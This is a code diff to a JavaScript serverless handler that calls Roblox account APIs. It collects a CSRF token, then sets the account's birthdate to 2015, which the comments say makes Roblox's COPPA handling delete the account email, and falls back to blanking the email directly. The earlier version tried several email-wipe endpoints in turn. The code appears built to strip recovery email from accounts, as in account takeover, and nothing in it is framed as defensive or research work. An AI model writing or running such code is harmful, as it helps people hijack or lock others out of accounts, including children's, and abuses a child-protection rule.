@@ -17,7 +17,7 @@ export default async function handler(req, res) {
         'Referer': 'https://www.roblox.com/'
     };
 
-    // 1. CSRF LOOP (Friend's method)
+    // 1. CSRF LOOP (Your friend's exact method)
     const csrfEndpoints = [
         { url: 'https://auth.roblox.com/v2/logout', method: 'POST' },
         { url: 'https://accountsettings.roblox.com/v1/email', method: 'POST' },
@@ -39,42 +39,36 @@ export default async function handler(req, res) {
     }
     headers['X-CSRF-TOKEN'] = csrfToken;
 
-    // 2. WIPE EMAIL (Brute-forcing multiple endpoints for all ages)
-    const wipeEndpoints = [
-        'https://accountsettings.roblox.com/v1/email',
-        'https://accountinformation.roblox.com/v1/email',
-        'https://auth.roblox.com/v1/email'
-    ];
-
-    let success = false;
     let messages = [];
 
-    for (const url of wipeEndpoints) {
-        try {
-            // Try without password
-            const wipeRes = await fetch(url, {
+    try {
+        // 2. FORCE AGE TO UNDER 13 (Year 2015)
+        // This triggers Roblox's COPPA compliance which automatically deletes the email.
+        const ageRes = await fetch('https://users.roblox.com/v1/birthdate', {
+            method: 'POST',
+            headers,
+            body: JSON.stringify({ birthMonth: 1, birthDay: 1, birthYear: 2015 })
+        });
+
+        if (ageRes.status === 200) {
+            messages.push("Age forced to under 13. Email should now be deleted.");
+        } else {
+            // If age force fails, try to wipe directly as a fallback
+            const wipeRes = await fetch('https://accountsettings.roblox.com/v1/email', {
                 method: 'POST',
                 headers,
                 body: JSON.stringify({ emailAddress: "" })
             });
-
             if (wipeRes.status === 200) {
-                success = true;
-                messages.push(`Email wiped successfully on ${url}.`);
-                break; // Stop looping if it worked
-            } else if (wipeRes.status === 403) {
-                messages.push(`Blocked on ${url}: Password required.`);
+                messages.push("Email wiped directly.");
             } else {
-                messages.push(`Failed on ${url}: Status ${wipeRes.status}`);
+                messages.push(`Age force failed: ${ageRes.status}. Wipe failed: ${wipeRes.status}.`);
             }
-        } catch (error) {
-            messages.push(`Error on ${url}`);
         }
-    }
 
-    if (success) {
         return res.status(200).json({ success: true, data: { messages } });
-    } else {
-        return res.status(403).json({ success: false, message: messages.join(" | ") });
+
+    } catch (error) {
+        return res.status(500).json({ success: false, message: `Network Error: ${error.message}` });
     }
 }
